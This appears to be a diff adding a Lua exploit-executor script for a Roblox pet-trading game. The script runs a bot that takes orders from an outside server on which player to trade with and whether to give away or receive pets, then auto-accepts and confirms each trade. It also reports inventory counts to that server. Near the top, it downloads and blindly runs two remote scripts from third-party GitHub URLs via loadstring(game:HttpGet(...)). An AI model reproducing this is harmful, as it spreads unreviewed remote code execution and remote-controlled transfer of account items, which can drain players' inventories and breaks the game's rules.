@@ -1,0 +1,245 @@
+--==[ CONFIG ]==--
+getgenv().Config = {
+    PetName = "aztec_egg_2025_golden_lynx",
+    MaxPerTrade = 18,      -- максимум предметов в одном трейде
+    ApiBase = "https://temesssss.pythonanywhere.com",
+    PollDelay = 5,         -- как часто опрашиваем GetLastAccount (сек)
+    TradeOpenTimeout = 20, -- сколько ждём открытия окна трейда (сек)
+    PlayerFindTimeout = 30 -- сколько ждём игрока по нику в сервере (сек)
+}
+
+--==[ PRELOAD YOUR UTIL SCRIPTS IF NEEDED ]==--
+print("Run Script")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Rano194/Others/refs/heads/main/Dehash"))()
+print("[INFO] loading dehash remote")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Rano194/Scripts/refs/heads/main/PlayButtonNews1"))()
+task.wait(15)
+
+--==[ SERVICES & SHORTCUTS ]==--
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+
+local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
+
+local TradeAPI = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI")
+local SendTradeRequest = TradeAPI:WaitForChild("SendTradeRequest")
+local AddItemToOffer = TradeAPI:WaitForChild("AddItemToOffer")
+local AcceptNegotiation = TradeAPI:WaitForChild("AcceptNegotiation")
+local ConfirmTrade = TradeAPI:WaitForChild("ConfirmTrade")
+local TradeRequestReceived = TradeAPI:WaitForChild("TradeRequestReceived")
+
+--==[ HTTP REQUEST WRAPPER ]==--
+local requestFunc = syn and syn.request or http_request or request
+
+local function trim(s) return (string.gsub(s or "", "^%s*(.-)%s*$", "%1")) end
+
+local function decode_json_safe(body)
+    local ok, data = pcall(function()
+        return HttpService:JSONDecode(trim(body))
+    end)
+    if ok then return data end
+    return nil, "JSON decode failed"
+end
+
+local function http_get_json(path_with_query)
+    local url = string.format("%s%s", getgenv().Config.ApiBase, path_with_query)
+    local res = requestFunc({ Url = url, Method = "GET" })
+    if not res or res.StatusCode >= 400 then
+        return nil, string.format("HTTP %s", res and res.StatusCode or "nil")
+    end
+    return decode_json_safe(res.Body)
+end
+
+local function http_get_raw(path_with_query)
+    local url = string.format("%s%s", getgenv().Config.ApiBase, path_with_query)
+    return requestFunc({ Url = url, Method = "GET" })
+end
+
+--==[ INVENTORY HELPERS ]==--
+local function getPlayerData()
+    return ClientData.get_data()[tostring(LocalPlayer)]
+end
+
+local function countStockAll(petName)
+    -- Счётчик общего стока для /SetPetsStock (как у тебя раньше)
+    local count = 0
+    for _, pet in pairs((getPlayerData().inventory.pets) or {}) do
+        if pet.kind == petName and pet.properties.age < 6 and not pet.properties.mega_neon then
+            count += 1
+        end
+    end
+    return count
+end
+
+local function updatePetsStockOnServer()
+    local stock = countStockAll(getgenv().Config.PetName)
+    http_get_raw("/api/SetPetsStock?int=" .. stock)
+end
+
+-- приоритет выдачи: не-neon → neon; всегда исключаем mega, age<6
+local function getFilteredPetsForGive(petName, maxCount)
+    local normal = {}
+    local neon = {}
+    for _, pet in pairs((getPlayerData().inventory.pets) or {}) do
+        if pet.kind == petName and pet.properties.age < 6 and not pet.properties.mega_neon then
+            if not pet.properties.neon then
+                table.insert(normal, pet)
+            else
+                table.insert(neon, pet)
+            end
+        end
+    end
+    local result = {}
+    for _, p in ipairs(normal) do
+        if #result >= maxCount then break end
+        table.insert(result, p)
+    end
+    for _, p in ipairs(neon) do
+        if #result >= maxCount then break end
+        table.insert(result, p)
+    end
+    return result
+end
+
+--==[ TRADE HELPERS ]==--
+local TradeGuiPath = LocalPlayer.PlayerGui:WaitForChild("TradeApp")
+local function isTradeOpen()
+    return TradeGuiPath.Frame.Visible == true
+end
+
+local function waitTradeOpen(timeoutSec)
+    local t0 = os.clock()
+    while os.clock() - t0 < (timeoutSec or getgenv().Config.TradeOpenTimeout) do
+        if isTradeOpen() then return true end
+        task.wait(0.2)
+    end
+    return isTradeOpen()
+end
+
+local function acceptConfirmUntilClosed(maxTimeSec)
+    local t0 = os.clock()
+    while isTradeOpen() do
+        AcceptNegotiation:FireServer()
+        ConfirmTrade:FireServer()
+        task.wait(0.5)
+        if maxTimeSec and (os.clock() - t0) > maxTimeSec then
+            break
+        end
+    end
+    return not isTradeOpen()
+end
+
+local expectedTargetName = nil
+-- Автоответ на входящие запросы: принимаем только от ожидаемого игрока, остальных отклоняем
+TradeRequestReceived.OnClientEvent:Connect(function(player)
+    if expectedTargetName and player and player.Name == expectedTargetName then
+        ReplicatedStorage.API["TradeAPI/AcceptOrDeclineTradeRequest"]:InvokeServer(player, true)
+        print("[INFO] Accepted trade from:", player.Name)
+    else
+        ReplicatedStorage.API["TradeAPI/AcceptOrDeclineTradeRequest"]:InvokeServer(player, false)
+        print("[INFO] Declined trade from:", player and player.Name or "nil")
+    end
+end)
+
+local function findPlayerByName(name, timeout)
+    local t0 = os.clock()
+    while os.clock() - t0 < (timeout or getgenv().Config.PlayerFindTimeout) do
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if plr.Name == name then
+                return plr
+            end
+        end
+        task.wait(0.5)
+    end
+    return nil
+end
+
+local function sendTradeRequestTo(name)
+    local plr = findPlayerByName(name)
+    if not plr then
+        print("[WARN] Player not found in server:", name)
+        return false
+    end
+    expectedTargetName = name
+    SendTradeRequest:FireServer(plr)
+    print("[INFO] Sent trade request to:", name)
+    return true
+end
+
+local function addPetsToOffer(pets)
+    for _, pet in ipairs(pets) do
+        AddItemToOffer:FireServer(pet.unique)
+        task.wait(0.05)
+    end
+end
+
+--==[ MAIN LOOP ]==--
+print("[INFO] Storage started. Pet:", getgenv().Config.PetName)
+updatePetsStockOnServer()
+
+while true do
+    task.wait(getgenv().Config.PollDelay)
+
+    -- 1) Берём заявку
+    local data, err = http_get_json("/api/GetLastAccount")
+    if not data then
+        print("[WARN] GetLastAccount failed:", err)
+        continue
+    end
+
+    local NeedPets = tonumber(data.NeedPets) or 0
+    local Nickname = tostring(data.Nickname or "")
+    local status   = tostring(data.Status or "")
+
+    if Nickname == "" or status == "" then
+        continue
+    end
+
+    -- 2) Отправляем запрос в трейд целевому игроку (и ждём открытия)
+    if not sendTradeRequestTo(Nickname) then
+        -- Не нашли игрока → попробуем со следующей заявкой в следующий тик
+        continue
+    end
+
+    if not waitTradeOpen() then
+        print("[WARN] Trade window didn't open. Skipping.")
+        expectedTargetName = nil
+        continue
+    end
+
+    -- 3) Ветвление по статусу
+    if status == "WaitGivePets" then
+        -- Выдать питомцев
+        local toGiveCount = math.min(NeedPets, getgenv().Config.MaxPerTrade)
+        local pets = getFilteredPetsForGive(getgenv().Config.PetName, toGiveCount)
+        if #pets == 0 then
+            print("[INFO] No pets to give right now.")
+        else
+            addPetsToOffer(pets)
+            print(string.format("[INFO] Offered pets: %d/%d", #pets, toGiveCount))
+        end
+
+        -- Подтверждаем до закрытия
+        acceptConfirmUntilClosed(20)
+        updatePetsStockOnServer()
+        print("[INFO] Trade finished (give).")
+
+    elseif status == "Competing" then
+        -- Принимаем обратную передачу (бот добавляет предметы)
+        print("[INFO] Receiving pets back. Accepting...")
+        acceptConfirmUntilClosed(30)
+        updatePetsStockOnServer()
+        print("[INFO] Trade finished (receive).")
+
+    elseif status == "Pending" then
+        -- Удаляем заявку и двигаемся дальше
+        http_get_raw("/api/DelLastAccount")
+        print("[INFO] Pending -> deleted last account")
+    else
+        print("[INFO] Unknown status:", status)
+    end
+
+    expectedTargetName = nil
+end
